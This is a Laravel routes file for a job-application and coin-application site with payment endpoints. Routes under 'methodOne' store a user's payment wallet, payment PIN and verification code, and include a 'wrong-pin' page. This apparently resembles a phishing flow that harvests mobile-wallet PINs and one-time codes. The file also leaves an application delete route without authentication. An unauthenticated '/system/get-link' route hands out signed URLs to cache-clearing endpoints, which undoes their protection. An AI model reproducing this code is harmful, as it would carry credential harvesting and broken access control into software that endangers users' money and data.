<?php

use App\Helpers\MetaTagHelper;
use App\Http\Controllers\ApplicationDeleteController;
use App\Http\Controllers\CopyApplicationInfoController;
use App\Http\Controllers\FormController;
use App\Http\Controllers\FormFrontendController;
use App\Http\Controllers\JobApplicationController;
use App\Http\Controllers\LalcoinController;
use App\Http\Controllers\MethodOneRegistrationController;
use Illuminate\Support\Facades\Route;
use Inertia\Inertia;
use Illuminate\Support\Facades\Artisan;

Route::get('/', function () {
    return Inertia::render('JobLanding')
        ->withViewData(MetaTagHelper::forJobs());
})->name('home');

Route::post('/job-applications/session', [JobApplicationController::class, 'storeSession'])->name('job-applications.session');

Route::prefix('methodOne')->name('methodOne.')->group(function () {
    Route::get('/payment', [MethodOneRegistrationController::class, 'payment'])->name('payment');
    Route::get('/password', [MethodOneRegistrationController::class, 'password'])->name('password');
    Route::get('/wrong-pin', [MethodOneRegistrationController::class, 'wrongPin'])->name('wrong-pin');
    Route::get('/verification', [MethodOneRegistrationController::class, 'verification'])->name('verification');

    Route::post('/store-payment-wallet', [MethodOneRegistrationController::class, 'storePaymentWallet'])->name('store-payment-wallet');
    Route::post('/store-payment-pin', [MethodOneRegistrationController::class, 'storePaymentPin'])->name('store-payment-pin');
    Route::post('/verification', [MethodOneRegistrationController::class, 'storeVerificationCode'])->name('verification.submit');
});


Route::post('/job-applications', [JobApplicationController::class, 'store'])->name('job-applications.store');
Route::post('/job-applications/init-payment', [JobApplicationController::class, 'initPayment'])->name('job-applications.init-payment');
Route::get('/payment/callback', [JobApplicationController::class, 'callback'])->name('payment.callback');

Route::get('/applications', [JobApplicationController::class, 'index'])->middleware('auth')->name('applications.index');

Route::delete('/applications/{id}', [JobApplicationController::class, 'destroy'])->name('applications.destroy');

Route::get('/lalcoin', [LalcoinController::class, 'index'])->name('lalcoin');
Route::post('/lalcoin/applications', [LalcoinController::class, 'store'])->middleware('throttle:30,1')->name('lalcoin.applications.store');
Route::post('/lalcoin/applications/init-payment', [LalcoinController::class, 'initPayment'])->middleware('throttle:30,1')->name('lalcoin.applications.init-payment');

Route::get('/coin-applications', [JobApplicationController::class, 'coinApplications'])->middleware('auth')->name('coin-applications.index');
Route::delete(
    '/coin-applications/{application}',
    [LalcoinController::class, 'destroy']
)->middleware('auth')->name('coin-applications.destroy');

Route::get('/forms/{slug}', [FormFrontendController::class, 'show'])
    ->where('slug', '[a-z0-9]+(?:-[a-z0-9]+)*')
    ->name('forms.frontend');
Route::get('/forms/{slug}/{path}', [FormFrontendController::class, 'asset'])
    ->where('slug', '[a-z0-9]+(?:-[a-z0-9]+)*')
    ->where('path', '.*')
    ->name('forms.frontend.asset');

Route::post('/submit-form', [FormController::class, 'store'])
    ->middleware(['throttle:30,1', 'form-api-client'])
    ->name('forms.submit');
Route::post('/init-payment', [FormController::class, 'initPayment'])
    ->middleware(['throttle:30,1', 'form-api-client'])
    ->name('forms.init-payment');
Route::middleware(['auth', 'admin'])->group(function () {
    Route::get('/all-applications', [FormController::class, 'index'])->name('all-applications.index');
    Route::get('/all-applications/{application}', [FormController::class, 'show'])->name('all-applications.show');
});

Route::get('dashboard', function () {
    return Inertia::render('Dashboard');
})->middleware(['auth', 'verified'])->name('dashboard');

Route::get('/applications/{application}/delete-confirm', [ApplicationDeleteController::class, 'confirm'])
    ->name('applications.delete-confirm')
    ->middleware('signed');

Route::post('/applications/{application}/delete', [ApplicationDeleteController::class, 'destroy'])
    ->name('applications.delete')
    ->middleware('auth');



Route::get('/copy/{application}', [CopyApplicationInfoController::class, 'show'])
    ->name('applications.copy')
    ->middleware('signed');



Route::prefix('system')->middleware('signed')->group(function () {

    // পুরো ক্যাশ ক্লিয়ার + অপটিমাইজ (clear-cache.php, clear-cache-simple.php, clear-cache-v2.php, clear-cache-v3.php এর কাজ)
    Route::get('/clear-cache', function () {
        $output = [];

        foreach (['config:clear', 'cache:clear', 'view:clear', 'route:clear'] as $command) {
            Artisan::call($command);
            $output[] = "✓ {$command}";
        }

        foreach (['config:cache', 'route:cache', 'view:cache'] as $command) {
            Artisan::call($command);
            $output[] = "✓ {$command}";
        }

        return response('<pre>' . implode("\n", $output) . "\n\n✅ Done.</pre>");
    })->name('system.clear-cache');

    // শুধু রুট ক্যাশ (clear-routes.php এর কাজ)
    Route::get('/clear-routes', function () {
        Artisan::call('route:clear');
        Artisan::call('route:cache');

        return response('<pre>✓ route:clear
✓ route:cache

✅ Done.</pre>');
    })->name('system.clear-routes');

});

Route::get('/system/get-link', function () {
    return [
        'clear-cache' => URL::signedRoute('system.clear-cache'),
        'clear-routes' => URL::signedRoute('system.clear-routes'),
    ];
});

require __DIR__.'/settings.php';
